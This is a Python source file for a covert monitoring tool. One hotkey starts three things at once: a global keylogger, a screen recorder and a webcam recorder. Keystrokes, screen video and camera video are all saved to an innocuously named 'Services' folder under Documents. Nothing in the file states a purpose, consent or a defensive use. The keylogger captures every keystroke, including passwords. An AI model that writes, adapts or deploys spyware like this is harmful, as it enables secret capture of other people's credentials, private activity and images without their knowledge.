import keyboard
import cv2
import time
import os
import threading
import numpy as np
from mss import mss
from datetime import datetime

# Status for each feature
is_camera_recording = False
is_screen_recording = False
is_keylogging = False
stop_requested = False

cap = None
camera_out = None
screen_out = None

BASE_DIR = os.path.join(os.path.expanduser("~"), "Documents", "Services")

# =========== Keylogger ===========
def on_key_event(event):
    if event.event_type == keyboard.KEY_DOWN:
        if event.name == 'space':
            char_to_write = ' '
        elif event.name == 'enter':
            char_to_write = '\n'
        elif event.name == 'tab':
            char_to_write = '\t'
        elif event.name == 'backspace':
            print('\b \b', end='', flush=True)
            char_to_write = '[BACKSPACE]'
        elif len(event.name) == 1:
            char_to_write = event.name
        else:
            char_to_write = f'[{event.name.upper()}]'

        with open(BASE_DIR + '/keylog.txt', 'a', encoding='utf-8') as f:
            f.write(char_to_write)


def start_keylogger():
    global is_keylogging, stop_requested
    
    if is_keylogging:
        return
    
    is_keylogging = True
    stop_requested = False
    
    with open(BASE_DIR + '/keylog.txt', 'a', encoding='utf-8') as f:
        f.write(f"\n{'='*50}\n")
        f.write(f"Session started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"{'='*50}\n")
    
    keyboard.hook(on_key_event)
    keyboard.wait()
    keyboard.unhook_all()
    
    with open(BASE_DIR + '/keylog.txt', 'a', encoding='utf-8') as f:
        f.write(f"\n{'='*50}\n")
        f.write(f"Session ended at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"{'='*50}\n")
    
    is_keylogging = False

# ============ RECORD SCREEN ============
def record_screen():
    global is_screen_recording, screen_out, stop_requested

    if is_screen_recording:
        return

    is_screen_recording = True
    stop_requested = False
    os.makedirs(BASE_DIR, exist_ok=True)

    timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
    filename = os.path.join(BASE_DIR, f"screen_{timestamp}.mp4")

    sct = mss()
    monitor = sct.monitors[1]
    width = monitor["width"]
    height = monitor["height"]

    fps = 15.0
    fourcc = cv2.VideoWriter_fourcc(*"mp4v")
    screen_out = cv2.VideoWriter(filename, fourcc, fps, (width, height))

    try:
        while is_screen_recording and not stop_requested:
            img = sct.grab(monitor)
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)

            screen_out.write(frame)

            if cv2.waitKey(1) & 0xFF == ord('q'):
                break

    except Exception as e:
        print("Error:", e)

    finally:
        if screen_out:
            screen_out.release()
            screen_out = None
        cv2.destroyAllWindows()
        is_screen_recording = False


# ============ RECORD CAMERA ============
def record_camera():
    global is_camera_recording, cap, camera_out, stop_requested

    if is_camera_recording:
        return

    is_camera_recording = True
    stop_requested = False
    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        is_camera_recording = False
        cap = None
        return

    os.makedirs(BASE_DIR, exist_ok=True)

    timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
    filename = os.path.join(BASE_DIR, f"camera_{timestamp}.mp4")

    frame_width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
    frame_height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
    fps = 20.0

    fourcc = cv2.VideoWriter_fourcc(*"mp4v")
    camera_out = cv2.VideoWriter(filename, fourcc, fps, (frame_width, frame_height))

    try:
        while is_camera_recording and not stop_requested:
            ret, frame = cap.read()
            if not ret:
                break

            camera_out.write(frame)

            if cv2.waitKey(1) & 0xFF == ord('q'):
                break

    except Exception as e:
        print("Error:", e)

    finally:
        if cap:
            cap.release()
            cap = None
        if camera_out:
            camera_out.release()
            camera_out = None
        cv2.destroyAllWindows()
        is_camera_recording = False


# ======== THREADS ========
def record_camera_thread():
    t = threading.Thread(target=record_camera, daemon=True)
    t.start()

def record_screen_thread():
    t = threading.Thread(target=record_screen, daemon=True)
    t.start()

def keylogger_thread():
    t = threading.Thread(target=start_keylogger, daemon=True)
    t.start()

def stop_all_recording():
    global is_camera_recording, is_screen_recording, stop_requested
    stop_requested = True
    is_camera_recording = False
    is_screen_recording = False


# ======== MAIN ========
def main():
    keyboard.add_hotkey("ctrl+shift+c", record_camera_thread)
    keyboard.add_hotkey("ctrl+shift+c", record_screen_thread)
    keyboard.add_hotkey("ctrl+shift+c", keylogger_thread)
    keyboard.add_hotkey("ctrl+shift+q", stop_all_recording)

    try:
        keyboard.wait()
    except KeyboardInterrupt:
        print("\nTurn off program...")
    finally:
        global cap, camera_out, screen_out
        if cap:
            cap.release()
            cap = None
        if camera_out:
            camera_out.release()
            camera_out = None
        if screen_out:
            screen_out.release()
            screen_out = None
        cv2.destroyAllWindows()

if __name__ == "__main__":
    main()